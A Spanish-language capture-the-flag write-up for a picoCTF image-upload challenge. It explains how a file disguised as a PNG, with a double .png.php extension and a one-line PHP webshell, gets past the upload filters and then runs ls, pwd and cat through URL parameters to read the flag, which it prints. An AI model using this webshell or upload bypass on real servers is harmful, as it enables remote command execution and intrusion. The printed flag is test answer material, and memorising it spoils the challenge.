### Descripción
I found a web app that can help process images: PNG images only!
### Descripción

### Solución
Primero nos metemos al archivo robots y buscamos pistas
http://atlas.picoctf.net:54373/robots.txt

De acuerdo a las pistas que se encontraron en instructions podemos meter un archivo png, asi que descargamos un archivo con extensión png para pasar el primer filtro.

Ahora haremos un segundo archivo donde vamos a pedirle a alguna IA que nos mandé un webshell y lo ponemos en un archivo php usando:
```
nano webshell.png.php
```
 y pegamos lo que nos dio la IA:
```
 PNG
<?php system($_GET['cmd']); ?>
```

Para pasar el siguiente filtro usamos el archivo que creamos, con ello podremos ejecutar instrucciones para ver los archivos:

* Para listar los archivos
	http://atlas.picoctf.net:54373/uploads/webshell.png.php?cmd=ls
- Para ver donde nos encontramos
	http://atlas.picoctf.net:54373/uploads/webshell.png.php?cmd=pwd
- Para ver los archivos en la carpeta superior
	http://atlas.picoctf.net:54373/uploads/webshell.png.php?cmd=ls%20..
	
	PNG MQZWCYZWGI2WE.txt index.php instructions.txt robots.txt uploads
- Entramos al archivo con nombre raro:
	http://atlas.picoctf.net:54373/uploads/webshell.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt

Y ahi encontramos la flag

**Flag**: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
### Notas Adicionales

### Referencias